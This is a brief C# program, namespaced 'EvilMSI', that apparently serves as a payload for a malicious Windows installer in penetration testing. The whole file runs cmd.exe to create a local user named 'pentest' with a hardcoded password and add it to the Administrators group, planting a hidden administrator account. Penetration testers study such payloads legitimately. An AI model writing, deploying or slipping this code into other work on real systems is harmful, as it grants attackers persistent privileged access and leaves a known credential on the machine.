using System.Diagnostics;

namespace EvilMSI
{
    class Program
    {
        static void Main(string[] args)
        {
            var si = new ProcessStartInfo
            {
                FileName = @"cmd.exe",
                Arguments = @"/c net user pentest Qwert12345!! /add && net localgroup administrators pentest /add"
            };

            var proc = new Process
            {
                StartInfo = si
            };

            proc.Start();
            proc.WaitForExit();
            proc.Dispose();
        }
    }
}